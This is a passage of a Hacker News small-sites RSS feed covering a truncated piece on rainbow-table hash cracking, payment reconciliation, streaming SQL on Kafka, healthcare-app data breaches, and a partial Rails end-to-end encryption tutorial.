about Rainbow Tables, because it is the application which puts the 
theory above into code. It has been very successful, with many websites 
dedicated to generating rainbowcrack hash tables and letting users search them.</p>

<p>However there is a pretty clear way this application could be improved, 
very easily, in the sense that the generated tables would take up a lot less
disk space, but be equally as effective for breaking hashes:</p>

<p>Remember above that when you want to generate a certain chain 
you start from an arbitrary hash. This just means it doesn't matter where 
you choose to start from. The rainbowcrack application starts from a randomly 
generated 64-bit number. This number is then used to generate a chain which 
ultimately ends with a 128-bit hash, which is reduced to another 64-bit number.</p>

<p>Why use a randomly generated number as the starting point? A …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://kestas.kuliukas.com/RainbowTables/">http://kestas.kuliukas.com/RainbowTables/</a></em></p>]]>
            </description>
            <link>http://kestas.kuliukas.com/RainbowTables/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201513</guid>
            <pubDate>Tue, 24 Nov 2020 18:43:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What does it mean to “reconcile to cash”?]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201471">thread link</a>) | @qin
<br/>
November 24, 2020 | https://www.moderntreasury.com/journal/what-is-automatic-reconciliation | <a href="https://web.archive.org/web/*/https://www.moderntreasury.com/journal/what-is-automatic-reconciliation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Businesses that manage payments at scale face the complex challenge of reliably monitoring cash. Most of us have experienced the time delays inherent to ACH, wires, and checks. These delays make it difficult to tie a payment you’ve made or expect to receive to the actual transaction that posts to your bank account. This process is called reconciliation and it is essential for a business to understand how completed and in-progress transactions add up to the cash balance in its bank account.&nbsp;<br></p><p>Most finance teams try to solve the reconciliation problem with spreadsheets, email and manual examination of bank statements — processes that are inefficient and error-prone. At Modern Treasury, we’ve built a better solution that helps finance teams save time and minimize errors. We call it Automatic Reconciliation.&nbsp;<br></p><p>With Automatic Reconciliation, Modern Treasury automatically matches your payments and returns to transactions as they are made available by your bank. Reconciled transactions are reflected in the previous day and intra-day balances available through the API and dashboard, allowing you to reliably monitor cash across all your business bank accounts.&nbsp;</p><p>‍<br></p><h4>How Does Reconciliation Help With Monitoring Cash?<br></h4><p>Let’s say you run a marketplace for artisanal coffee that lets coffee aficionados buy coffee from artisanal coffee roasters anywhere in the country. You collect payments from the buyer, deduct your platform fee and pay the seller. You also need to handle other types of transactions, like refunds and bonus payments to your top performing sellers. Business is going well so you’re processing thousands of orders a week.&nbsp;<br></p><p>To reliably monitor cash, you need to be able to match every single payment you’ve made or received to the corresponding transaction in your bank statement. At scale, this quickly gets very complicated for three reasons.&nbsp;</p><p>‍</p><h4>1. Banks Don’t Move Money as Fast as Your Business <br></h4><p>The time it takes for your transaction to settle depends on which payment method you use. Here’s a list of business payment methods used in the US and their typical settlement times. Because of these settlement timeframes, the rate at which you move money is slower than your business activities.&nbsp;<br></p><figure id="w-node-260693cab140-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5fbc098771bac937c487c98a_AutomaticReconciliationTable.png" loading="lazy" alt=""></p></figure><p><br>Let’s say you pay coffee sellers on a daily basis. If you initiate a number of ACH credits on Monday, they are likely to settle by Tuesday. But by the time they settle, you have already initiated a new batch of payments on Tuesday that will settle on Wednesday.&nbsp;<br></p><p>Without reconciliation, it’s hard to keep track of the cash available in your bank account, what transactions are processing versus complete, and when different sets of transactions are likely to settle.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><h4>2. Banks Process Transactions in Batches</h4><p>Let’s say you need to pay 10 coffee roasters $1000 each at the end of the week. You initiate 10 ACH credit transactions, each for $1000 on Friday before the day’s cut-off. These transactions will likely post to your bank statement Monday evening or Tuesday morning next week.&nbsp;<br></p><p>When you ask your bank to make a payment, it’s placed into a queue that’s sent to the network for processing after a certain cut-off time for the day. Any transactions submitted after the cut-off time are queued up to be processed the next business day. Different banks have different <a href="https://docs.moderntreasury.com/reference#ach-timings" target="_blank">cut-off times</a> for processing transactions.<br></p><p>The next day, instead of seeing 10 separate transactions next week, you’ll see one transaction for $10,000 on your statement. Because ACH transactions take place in batches, your bank directly debits your account for the total amount even though it represents 10 separate payments. Reconciliation helps you tie each payment to the appropriate transaction on your bank statement.&nbsp;</p><h4>3. Monitoring Incoming Payments and Returns is Difficult</h4><p>Let’s say you’re also expecting 100 payments of $20 each from your buyers. You need to know when they hit your bank account to predict cash accurately. You also need to tie each payment to an order. Similar to when you make bulk payments, your bank may record all or some of those payments as a single transaction on your statement.&nbsp;<br></p><p><a href="https://www.moderntreasury.com/journal/what-happens-when-you-ach-a-dead-person" target="_blank">Payment returns</a> also complicate monitoring cash flow. For example, ACH credits will fail due to incorrect account or routing numbers and ACH debits will fail if the counterparty doesn’t have sufficient funds in their account. In both scenarios, your bank will post a return transaction to your bank statement that needs to be reconciled with the original payment.</p><h4>Automatic Reconciliation<br></h4><p>Until now, many companies have relied on manual reconciliation processes that typically involve exporting transactions from the bank portal to a spreadsheet and manually matching them with payments. In addition to being time consuming, the need to email multiple spreadsheets back and forth makes collaboration painful.&nbsp;<br></p><p>With Automatic Reconciliation, Modern Treasury instantly reconciles every single payment with transactions in your bank statement. We <a href="https://www.moderntreasury.com/journal/tentative-reconciliation" target="_blank">tentatively reconcile</a> the transaction when it’s pending and complete the process when it posts. Because ACH processes transactions in batches, a large number of transactions on your bank statement are likely to represent multiple distinct payments. If the transaction aggregates multiple Payment Orders, we automatically create matching <a href="https://docs.moderntreasury.com/reference#transaction-line-item-object" target="_blank">Transaction Line Items</a>.&nbsp;<br></p><p>When you see a Payment Order marked as completed, you can click into it in the web application to see the matching transaction.&nbsp;<br>‍<br></p><figure id="w-node-bb5fd7410dc0-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5fbc08ea82af2f7050239826_Payment%20Orders%20-%20640%20px.gif" loading="lazy" alt=""></p></figure><p><br>The Expected Payments feature allows you to monitor your bank account for payments you do not initiate. When the transaction is made available by your bank, it is automatically reconciled with the Expected Payment. You can choose to be notified by <a href="https://docs.moderntreasury.com/reference#expected-payments">webhook</a> or email about its status.&nbsp;&nbsp;&nbsp;<br></p><figure id="w-node-6bf8f8776d0d-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5fbc08fdea9cc07dcb14b23c_Expected%20Payments%20-%20640%20px.gif" loading="lazy" alt=""></p></figure><p><br>The Returns feature automatically matches returned payments to transactions and the original Payment Order, making identifying, correcting and redrafting returns a breeze.&nbsp;<br></p><figure id="w-node-2fa9dd183a06-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5fbc0910f4c807451c4b685e_Returns%20-%20640%20px.gif" loading="lazy" alt=""></p></figure><p><br>All the data you see in the app is also available through the API, allowing you to further automate and streamline reconciliation by integrating Modern Treasury directly into your business systems or platform.&nbsp;<br></p><p>We also have direct integrations with QuickBooks and NetSuite through our <a href="https://www.moderntreasury.com/journal/introducing-continuous-accounting" target="_blank">Continuous Accounting</a> product. It syncs Modern Treasury directly with your general ledger, allowing you to tag payments with accounting categories. When you’re closing out the books, all you need to do is click a few buttons in the web app to transfer payments that have been Automatically Reconciled to your accounting software.<br></p><p>Finally, because we connect to <a href="https://docs.moderntreasury.com/docs/banks" target="_blank">multiple banks</a>, you can use Modern Treasury to reconcile transactions and monitor cash across all your business bank accounts.&nbsp;</p><h4>Get Started With Automatic Reconciliation</h4><p><a href="https://www.moderntreasury.com/product-demo" target="_blank">Get in touch</a> if you’re interested in exploring Automatic Reconciliation for your business. We’d love to discuss your use case in detail.</p></div></div></div>]]>
            </description>
            <link>https://www.moderntreasury.com/journal/what-is-automatic-reconciliation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201471</guid>
            <pubDate>Tue, 24 Nov 2020 18:39:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to stream your data in Apache Kafka with SQL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201407">thread link</a>) | @Natasha_Fll
<br/>
November 24, 2020 | https://lenses.io/blog/2020/11/apache-kafka-with-streaming-sql-from-real-time-data/ | <a href="https://web.archive.org/web/*/https://lenses.io/blog/2020/11/apache-kafka-with-streaming-sql-from-real-time-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img alt="SELECT ApacheKafka WITH StreamingSQL FROM RealTimeData" src="https://images.ctfassets.net/tnuaj0t7r912/14MI0c1G0o6YM0jWb68az7/2623be6f9a8c8b47f72e878b351b604f/Mattero-KOH-Blog-v02.jpg?w=800&amp;q=100"></p><div><p>In another life, I taught the <i>Book of</i> <i>Genesis</i> to high school students, including The Tower of Babel excerpt. It struck me ironic that God’s wrath strikes down the tower, cofounds the universal language and scatters humans around the globe to teach King Nimrod a lesson in hubris; meanwhile, the boys in my class were texting their girlfriends across the country and playing video games with friends in Europe and Asia.&nbsp;</p><p>Technology allows us to form a new Tower; in particular, the ability to stream real-time events. For this technology to be built and managed, a common language is necessary, and more often than not, SQL is the common tongue of developers, architects and analysts. Recently, Matteo De Martino, Senior Scala Engineer at Lenses.io&nbsp; presented on the benefits of streaming SQL to react to real-time data for business critical decisions.&nbsp;</p><p>Anyone competent enough to build a pivot table on Excel understands how to act on data. You take a snapshot or data table and make an active query to parse out distribution and trends. While this is an important retrospective task, it does not allow for you to make business critical decisions in real-time.&nbsp;</p><p>The streaming SQL processors that Matteo explored in his <i>Kafka Office Hours </i>allow for users to process real-time data. As infinite amounts of data stream through an Apache Kafka cluster, users can model the transformations of data and write back to Kafka.</p><p>Lenses SQL Engine takes it a step further with SQL Processors. Not only can you model transformations, you can execute them as well. Users are able to scale, manage and govern their data with <a href="https://lenses.io/dataops/">DataOps</a>. </p><p>This activates data, allowing <a href="https://lenses.io/customers/">Lenses.io customers</a> to process data as it arrives and update the running state automatically.</p><p>Streaming SQL focuses on future data, so businesses can make time critical decisions. Matteo’s presentation outlines the advantages of Lenses Streaming SQL &amp; SQL processors. Watch his video below and then try SQL for yourself using <a href="https://lenses.io/box/">the Lenses Box, a self contained Apache Kafka environment.&nbsp;&nbsp;&nbsp;</a></p><p><iframe src="https://player.vimeo.com/video/483029806" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>


</div></div></div></div>]]>
            </description>
            <link>https://lenses.io/blog/2020/11/apache-kafka-with-streaming-sql-from-real-time-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201407</guid>
            <pubDate>Tue, 24 Nov 2020 18:33:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expensive Security Fails in Healthcare Apps]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25201335">thread link</a>) | @_Tata_
<br/>
November 24, 2020 | https://www.ego-cms.com/post/most-expensive-healthcare-app-security-fails-in-2018-2019 | <a href="https://web.archive.org/web/*/https://www.ego-cms.com/post/most-expensive-healthcare-app-security-fails-in-2018-2019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/healthcare"><p>Healthcare</p></a><h2>Most Expensive Healthcare App Security Fails in 2018–2019</h2><p>MyFitnessPal, PumpUp, and Strava all were unable to avoid data breaches. Find out why and what you can learn from these cases to make your app more secure.
</p></div></div><article><div target="_blank"><p>In 2018, the average cost for a corporate data breach reached almost <a href="https://igniteoutsourcing.com/healthcare/healthcare-security-breaches/">$4 million</a>.&nbsp;</p><p>Let’s take a look at a few of these attacks to learn what went wrong and secure your business from such risks.</p><h2>1 MyFitnessPal</h2><p>MyFitnessPal is a typical fitness application. It allows users to log cardio and strength exercises, connects with more than 50 devices and other apps, tracks steps, counts calories, and so on. Released in 2009, MyFitnessPal quickly gained popularity — it was chosen as the number one health and fitness app four years in a row. But everything changed in February 2018.</p><figure id="w-node-9fe8c2a22398-7a0a8b78"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/KRcvSWvR0kc"></iframe></p></figure><p>The MyFitnessPal data breach was probably one of the most publicized in the healthcare industry. Hackers accessed the personal data of almost <strong>150 million users</strong>, stealing their names, hashed passwords, IP addresses, and email addresses. Fortunately, the criminals couldn’t get to users’ credit card and social security numbers, as this data was collected and stored separately.&nbsp;<br></p><p><a href="https://www.underarmour.com/en-us?&amp;cid=PS%7Cgoogle%7CTrademark%7CUA%7CIP%7CExact%7Cunder%20armour%7CSRnf0L2T&amp;gclid=CjwKCAjw1_PqBRBIEiwA71rmtbPVRSTc31VHHLODl9D2ZnA-9HiTBv4xxSkBkyeWl8Z7kAJldUZ_QhoCaG8QAvD_BwE">Under Armour</a>, the company which acquired MyFitnessPal in 2015, became aware of the data breach at the end of March 2018. Four days later, users started to receive notifications and emails requiring them to change their passwords and offering recommendations on how to safeguard their accounts. In February 2019, the stolen personal details appeared on the dark web.&nbsp;<br></p><p>Other apps owned by Under Armour were not affected, but the company still <strong>lost 4.6% of its market</strong> <strong>value</strong> because of the data breach. However, the company and the app survived. MyFitnessPal still has a lot of users and pretty high ratings in the app stores (4.5 on Google Play).</p><h4><strong>What to learn from this case:</strong></h4><ul role="list"><li>MyFitnessPal should have been equipped with <strong>two-factor authentication</strong>. For a mobile application, we would recommend using biometric authentication or at least push notifications.&nbsp;</li></ul><ul role="list"><li>Reliable <strong>encryption</strong> is a must for companies that are serious about privacy and security.</li><li>For the majority of passwords, Under Armour used the <a href="https://content.myfitnesspal.com/security-information/FAQ.html">Bcrypt</a> hashing function. This is a reliable mechanism. But for the remaining passwords, the company used the <strong>rather weak </strong><a href="https://content.myfitnesspal.com/security-information/FAQ.html"><strong>SHA-1</strong></a>. Using Bcrypt for all passwords could have reduced the scope of the breach.</li></ul><ul role="list"><li>Collecting and <strong>storing</strong> the most important <strong>data separately</strong> is a great practice — it kept credit card data safe. Otherwise, Under Armour could have faced a much more serious loss in market value.</li></ul><ul role="list"><li>If a breach happens, it’s essential to <strong>notify users as fast as possible</strong> — keeping silent will simply destroy your company’s reputation. Under Armour did well here.</li></ul><h2>2 PumpUp</h2><p><a href="https://www.pumpup.com/#home">PumpUp</a> positions itself as the world’s most positive fitness community. It offers users numerous workouts and programs, an opportunity to learn more about fitness and get support from other members, and other features. After the app was released in 2012, it became rather popular.<br></p><p>The PumpUp data breach took place in May 2018, when personal data of more than <a href="https://www.zdnet.com/article/fitness-app-pumpup-leaked-health-data-private-messages/"><strong>6 million users</strong></a><strong> </strong>stopped being private. Data compromised included information on users’ locations, email addresses, gender, and dates of birth, full-resolution profile photos, workout data, health information (for instance, weight and height), device data, and private messages. In certain cases, even credit card data was exposed.&nbsp;<br></p><p>The incident happened because the core backend server hosted on the Amazon Cloud was left without a password for an indefinite amount of time. Anyone could see the private content of the app’s users.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cdf1127270466b858d20_5d78d2e9cd001218b4a025f0_eb187d1d-170d-44e4-8ab7-2aa08946fd06.png" loading="lazy" alt=""></p></figure><p>The exposed server wasn’t even found by the company — it was discovered by security researcher Oliver Hough who then contacted <a href="https://www.zdnet.com/article/fitness-app-pumpup-leaked-health-data-private-messages/">ZDNet</a>, a business technology news website, to investigate the case. ZDNet spent a week trying to get in touch with PumpUp, but there was no reply. However, in the end, the server was secured.<br></p><p>Since there were no comments from PumpUp after the breach, we can’t tell exactly how much money they lost. But their reputation was definitely affected.&nbsp;<br></p><h4><strong>What to learn from this case:</strong></h4><ul role="list"><li>To avoid this problem, PumpUp had at least to protect their data with a password. Ideally, this would have been combined with <strong>two-factor authentication</strong> to keep users’ data safe.&nbsp;</li></ul><ul role="list"><li>It seems that the company didn’t run any security tests — <strong>regular security scanning</strong> would have helped them notice the problem much earlier. EGO recommends performing such tests on a regular basis.</li><li>Another mistake PumpUp made was ignoring<strong> communications</strong> from ZDNet and ignoring the incident. If a breach happens, a company should stay in touch to show users that it cares.</li></ul><h2>Strava</h2><p><a href="https://www.strava.com/mobile">Strava</a> is a fitness app for tracking running, cycling, swimming, and other activities. It allows users to map and record their routes, analyze their activities, participate in challenges, etc. The app was released in 2009, and since then it has been installed more than 10 million times on Android OS alone (according to <a href="https://play.google.com/store/apps/details?id=com.strava&amp;hl=en">Google Play</a>; no data on iOS downloads is available).<br></p><p>The story of the Strava failure began in November 2017, when the company released a global heat map showing running routes for all users who opted to make their data publicly available. To create the map, Strava used GPS data from smartphones and fitness tracking devices on <strong>1 billion</strong> activities. This data was collected from 2015 to 2017. Over <strong>27 million</strong> users tracked their routes during this time, and due to confusing privacy settings, some of them didn’t even know that they were sharing sensitive data.&nbsp;<br></p><p>This map was the brainchild of Strava. But in January 2018, Nathan Ruser, an Australian student, noticed that by analyzing the map, it was possible to determine the whereabouts of military bases and other sensitive locations.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7c54a7adc793c1f5f41b3_5d78d3ce1f37d12d04642dcc_Artboard.png" loading="lazy" alt=""></p></figure><p>Strava and its map got a lot of criticism. In response, the company didn’t delete the map, but rather changed it significantly.&nbsp;<br></p><p>First of all, the data isn’t available to everyone anymore — to zoom in and see street-level detail, users now have to log in with their Strava account.&nbsp;<br></p><p>Second, the map is now updated monthly, which means that if a user changes their privacy settings and doesn’t want to provide data for the heat map anymore, their data won’t be included in the next month’s map.&nbsp;<br></p><p>Third, all roads and paths with little activity aren’t shown on the map until they’re used by different users (not only runners, for example) for different activities.<br></p><p>To develop the heat map, Strava had to collect, analyze, and put together loads of data, which took money and a lot of time. Then the company had to update the map significantly, which meant unexpected additional expenses.&nbsp;<br></p><h4><strong>What to learn from this case:</strong></h4><ul role="list"><li>In the case of Strava, there were no hackers or other criminals — the company gave out important information on its own. There was not even some kind of social engineering, as no fraud was involved. Strava simply didn’t pay enough attention to the potential outcome, and that was their main mistake — they didn’t anticipate the consequences. Explaining the importance of security and privacy to the entire team and <strong>training staff</strong> on a regular basis probably couldn’t have prevented this incident fully. But if the Strava staff would have thought about possible implications, they would have noticed that something was wrong during the map development phase.&nbsp;</li><li><strong>Privacy settings</strong> should not be confusing. Users must be able to set everything up easily and quickly. If privacy settings had been clearer, most users would have been able to prevent their private data from being published.</li></ul><h2>The Bottom Line</h2><p>To protect your healthcare app from security mistakes and failures, you have to pay attention not only to encryption and multi-factor authentication. As you can see from the Strava case, it’s also crucial to plan updates and new releases very carefully.&nbsp;<br></p><p>Follow these simple rules: run security tests and staff trainings on a regular basis, secure your app with multi-factor authentication and encryption, keep privacy settings simple, and analyze all potential outcomes.&nbsp;<br></p><p>And, obviously, if something does go wrong, stay in touch with your users. </p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7c533a29d5b2035e7ec00_5f6cbf011fddb44501d8d28d_5d3042f66324e92dec2018cb_Business%20Insights.png" loading="lazy" alt=""></p></figure><p>‍<br></p></div></article><section><div><div><p>LIKE THIS ARTICLE? Help us SPREAD THE WORD.</p></div></div></section></div>]]>
            </description>
            <link>https://www.ego-cms.com/post/most-expensive-healthcare-app-security-fails-in-2018-2019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201335</guid>
            <pubDate>Tue, 24 Nov 2020 18:26:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[E2E Encription with Rails and Stimulus.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201320">thread link</a>) | @ggsp
<br/>
November 24, 2020 | https://jensravens.com/e2e-encryption-with-rails/ | <a href="https://web.archive.org/web/*/https://jensravens.com/e2e-encryption-with-rails/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  
  <div>
    <p>July  7, 2020</p>
    

<h2 id="why-you-should-care-about-encryption">Why You Should Care About Encryption</h2>

<p>Nowadays, the news is full of data leaks, breaks, and hacks and one thing is clear - you don’t want to be the one who leaks all your customer data to some hackers on the internet. One of many ways of securing your application and your customer’s data is end-to-end encryption or (e2e encryption for short). This means that data gets encrypted as soon as possible on the user’s device, is sent encrypted over the wire, and only gets decrypted at the receiver’s device. This stands in contrast to the usual encryption at transport and encryption at rest which is used by most applications and is implemented at the protocol level (you just put SSL on your connection and no one can snoop on your data while in transport - isn’t that great?).</p>

<p>So which one to use?</p>

<h3 id="encryption-at-the-protocol-level-eg-ssl-encryption">Encryption at the protocol level (e.g. SSL encryption)</h3>

<ul>
  <li>is easy to implement and completely transparent to the application</li>
  <li>protects from hackers snooping out your data while it’s transported</li>
  <li>is supported pretty much everywhere and is fast</li>
  <li>allows everyone with access to the database (from admins to hackers) to see all the content in the database</li>
</ul>

<h3 id="e2e-encryption">E2E-Encryption</h3>

<ul>
  <li>removes an entire vector of attacks. No one except the designated receiver can see any data - not even the database admin</li>
  <li>adds a higher level of privacy - if the admin cannot accidentally see data that she shouldn’t see, you don’t need to think that much about regulating data access in production systems</li>
  <li>gives the user total control about her data</li>
  <li>is harder to implement as all data processing has to happen on the client (more about this later).</li>
</ul>

<p>So as both methods have their pros and cons, you should carefully consider which option to use. E2E encryption works great for very personal data (e.g. social security numbers, private messages, secure notes) while it becomes a really hard problem if you’re dealing with data you want to filter on the server side (server-side full-text search becomes impossible).</p>

<h2 id="how-does-e2e-encryption-work">How does E2E encryption work?</h2>

<p>This post focusses on asymmetric encryption - which is just for a fancy word for saying that you can encrypt a message with a public key and decrypt it with a corresponding private key. Only the owner of the private key can decrypt a message, but everyone having access to his public keys can send him encrypted messages. A popular implementation is PGP which is mostly used to encrypt emails.</p>

<h2 id="what-we-are-going-to-build">What we are going to build</h2>

<p>To showcase several parts of e2e encrypted systems, we’re going to build a secure messaging app where users can send each other encrypted messages. The encryption is based on our work on <a href="https://covtrace.de/">CovTrace</a>, a digital attendance list for restaurants during Covid19-times. Features include:</p>

<ul>
  <li>users can signup and manage their encryption keys</li>
  <li>users can create a new key pair of private and public key</li>
  <li>users can send messages to other users and encrypt them in the browser</li>
  <li>users can receive messages and decrypt them in the browser</li>
</ul>

<h2 id="the-tech-stack">The Tech-Stack</h2>

<p>Even though a lot of things happen on the client, we are going to use a fully server-side rendered application:</p>

<ul>
  <li>Rails, ActiveRecord and Postgres
    <ul>
      <li>slim as a templating engine (you could of course also use ERB)</li>
      <li>devise for user authentication</li>
    </ul>
  </li>
  <li>Webpacker and Stimulus for the JavaScript part</li>
  <li>openpgp.js as an encryption library</li>
  <li>Turbolinks to turn the application into a single page application (SPA)</li>
</ul>

<p>This blog post will highlight the relevant parts of encryption and key management. You can find a fully working application at GitHub: https://github.com/JensRavens/rails-stimulus-e2e-encryption</p>

<p>This app is a simplified version we are running successfully for CovTrace in production.</p>

<h2 id="the-application-skeleton">The Application Skeleton</h2>

<p>This section deals with the Rails-side of things: models, controllers, keeping data where it should be. If you’re only interested in the encryption part, you can skip to the next section.</p>

<p>Let’s get started with <code>User</code>s. Create a migration with <code>rails g model user keys</code> and modify it as follows:</p>

<div><div><pre><code><span>def</span> <span>change</span>
  <span>create_table</span> <span>:users</span> <span>do</span> <span>|</span><span>t</span><span>|</span>
    <span>t</span><span>.</span><span>text</span> <span>:keys</span><span>,</span> <span>array: </span><span>true</span><span>,</span> <span>null: </span><span>false</span><span>,</span> <span>default: </span><span>[]</span>
    <span>t</span><span>.</span><span>timestamps</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>As you can see the user has an array of (public) keys, so other users can send them encrypted messages. Let’s allow that user to login in: <code>rails g devise:install User</code> and suddenly your user can login and sign up. Let’s give him something to login to. Add some user routes to the <code>routes.rb</code> (more about messages later):</p>

<div><div><pre><code><span>resources</span> <span>:users</span><span>,</span> <span>only: </span><span>[</span><span>:index</span><span>,</span> <span>:show</span><span>,</span> <span>:update</span><span>],</span> <span>shallow: </span><span>true</span> <span>do</span>
  <span>resources</span> <span>:messages</span><span>,</span> <span>only: :create</span>
<span>end</span>
</code></pre></div></div>

<p>and create the users controller:</p>

<div><div><pre><code><span>class</span> <span>UsersController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>before_action</span> <span>:authenticate_user!</span>

  <span>def</span> <span>index</span>
    <span>@users</span> <span>=</span> <span>User</span><span>.</span><span>where</span><span>.</span><span>not</span><span>(</span><span>keys: </span><span>[]).</span><span>where</span><span>.</span><span>not</span><span>(</span><span>id: </span><span>current_user</span><span>.</span><span>id</span><span>).</span><span>order</span><span>(</span><span>email: :asc</span><span>)</span>
  <span>end</span>

  <span>def</span> <span>update</span>
    <span>@user</span> <span>=</span> <span>current_user</span>
    <span>@user</span><span>.</span><span>add_key</span> <span>params</span><span>.</span><span>require</span><span>(</span><span>:user</span><span>).</span><span>require</span><span>(</span><span>:public_key</span><span>)</span>
    <span>redirect_to</span> <span>root_path</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Thanks to devise we get the <code>current_user</code> method and an <code>authenticate_user!</code> filter for free and we can fully focus on our logic. The index page should have a list of all users that can be contacted (only users that have public keys can receive messages). Also, the <code>update</code> method allows adding additional keys via the <code>User</code> model:</p>

<div><div><pre><code><span>class</span> <span>User</span> <span>&lt;</span> <span>ApplicationRecord</span>
  <span>def</span> <span>add_key</span><span>(</span><span>key</span><span>)</span>
    <span>keys</span> <span>&lt;&lt;</span> <span>key</span>
    <span>save!</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let’s build some basic UI for it in <code>users/index.html.slim</code>:</p>

<div><div><pre><code><span>h1</span><span> </span>Conversations
<span>p</span><span> </span>Hello<span> </span><span>#{</span><span>current_user</span><span>.</span><span>email</span><span>}</span>!
<span>-</span> <span>if</span> <span>current_user</span><span>.</span><span>keys</span><span>.</span><span>any?</span> <span># only allow sending messages once some keys have been added</span>
  <span>ul</span>
    <span>-</span> <span>@users</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>user</span><span>|</span>
      <span>li</span><span> </span><span>=</span> <span>link_to</span> <span>user</span><span>.</span><span>email</span><span>,</span> <span>user</span>
<span>h2</span><span> </span>Key<span> </span>Management
<span>-</span> <span>if</span> <span>current_user</span><span>.</span><span>keys</span><span>.</span><span>any?</span>
  <span>h3</span><span> </span>Your<span> </span>Keys<span> </span>#<span> </span>list<span> </span>all<span> </span>known<span> </span>public<span> </span>keys<span> </span>of<span> </span>the<span> </span>logged<span> </span>in<span> </span>user
  <span>-</span> <span>current_user</span><span>.</span><span>keys</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>key</span><span>|</span>
    <span>pre</span><span> </span><span>=</span> <span>key</span>
<span>h3</span><span> </span>Add<span> </span><span>Keys</span><span>
</span><span>=</span><span> </span><span>form_with</span><span> </span>model:<span> </span>current_user<span> </span>do<span> </span>|f|
  <span>=</span> <span>f</span><span>.</span><span>label</span> <span>:public_key</span>
  <span>br</span>
  <span>=</span> <span>f</span><span>.</span><span>text_area</span> <span>:public_key</span><span>,</span> <span>required: </span><span>true</span>
  <span>br</span>
  <span>=</span> <span>f</span><span>.</span><span>submit</span> <span>"Add Key"</span>
</code></pre></div></div>

<p>And with that we have a more or less functional UI (more on generating keys later):</p>

<p><img src="https://jensravens.com/img/posts/pgp/key-management.png" alt="PGP Key Management"></p>

<p>Great, let’s add some messages with <code>rails g model message</code> and modifying the migration as follows:</p>

<div><div><pre><code><span>def</span> <span>change</span>
  <span>create_table</span> <span>:messages</span> <span>do</span> <span>|</span><span>t</span><span>|</span>
    <span>t</span><span>.</span><span>text</span> <span>:content</span><span>,</span> <span>null: </span><span>false</span>
    <span>t</span><span>.</span><span>references</span> <span>:sender</span><span>,</span> <span>null: </span><span>false</span><span>,</span> <span>foreign_key: </span><span>{</span> <span>to_table: :users</span> <span>}</span>
    <span>t</span><span>.</span><span>references</span> <span>:receiver</span><span>,</span> <span>null: </span><span>false</span><span>,</span> <span>foreign_key: </span><span>{</span> <span>to_table: :users</span> <span>}</span>
    <span>t</span><span>.</span><span>timestamps</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Messages have a sender and receiver and a text field to store the encrypted message and also a scope to retrieve the conversations a user is involved with:</p>

<div><div><pre><code><span>class</span> <span>Message</span> <span>&lt;</span> <span>ApplicationRecord</span>
  <span>belongs_to</span> <span>:sender</span><span>,</span> <span>class_name: </span><span>"User"</span>
  <span>belongs_to</span> <span>:receiver</span><span>,</span> <span>class_name: </span><span>"User"</span>
  <span>scope</span> <span>:with_user</span><span>,</span> <span>-&gt;</span> <span>(</span><span>user_id</span><span>)</span> <span>{</span> <span>where</span><span>(</span><span>sender_id: </span><span>user_id</span><span>).</span><span>or</span><span>(</span><span>where</span><span>(</span><span>receiver_id: </span><span>user_id</span><span>))</span> <span>}</span>
<span>end</span>
</code></pre></div></div>

<p>Now let’s give the user a way to see messages that were received to so far:</p>

<div><div><pre><code><span># users_controller.rb</span>
<span>def</span> <span>show</span>
  <span>@user</span> <span>=</span> <span>User</span><span>.</span><span>find</span> <span>params</span><span>[</span><span>:id</span><span>]</span>
  <span>@messages</span> <span>=</span> <span>Message</span><span>.</span><span>with_user</span><span>(</span><span>@user</span><span>.</span><span>id</span><span>).</span><span>with_user</span><span>(</span><span>current_user</span><span>.</span><span>id</span><span>).</span><span>order</span><span>(</span><span>created_at: :asc</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>This retrieves the user from the URL and all messages that have been exchanged between the current user and the selected user.</p>

<div><div><pre><code><span># users/show.html.slim</span>
<span>h1</span> <span>=</span> <span>@user</span><span>.</span><span>email</span>
